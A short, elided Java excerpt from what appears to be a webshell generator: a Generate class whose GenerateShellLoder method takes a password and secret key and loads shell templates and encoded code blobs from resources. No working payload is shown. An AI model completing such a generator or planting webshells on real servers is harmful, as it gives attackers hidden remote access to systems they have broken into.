...
class Generate {
    ...
    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        ...
        try {
            ...
            InputStream inputStream2 = Generate.class.getResourceAsStream("template/" + (isBin ? "raw" : "base64") + "Code.bin");
            ...
            InputStream inputStream3 = Generate.class.getResourceAsStream("template/shell." + suffix);
